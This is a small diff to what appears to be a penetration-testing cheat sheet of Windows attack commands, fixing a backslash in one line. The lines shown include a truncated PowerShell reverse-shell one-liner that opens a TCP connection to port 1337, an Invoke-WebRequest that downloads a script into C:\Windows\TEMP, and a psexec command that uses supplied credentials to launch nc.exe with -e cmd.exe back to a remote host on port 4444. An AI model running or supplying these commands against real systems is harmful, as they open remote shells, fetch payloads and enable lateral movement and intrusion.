@@ -10,7 +10,7 @@ $ip='192.168.1.114';$port=1337;$client = New-Object System.Net.Sockets.TCPClient
  Invoke-WebRequest "http://10.10.15.58/hex.ps1" -OutFile "C:\Windows\TEMP\hex.ps1" 
  
  #psexec 
-./ps.exe \\localip -h -accepteula -u username -p password cmd /c 'C:\nc.exe 192.168.50.138 4444 -e cmd.exe'
+./ps.exe \\\localip -h -accepteula -u username -p password cmd /c 'C:\nc.exe 192.168.50.138 4444 -e cmd.exe'
  
 #Check Powershell Version 
 
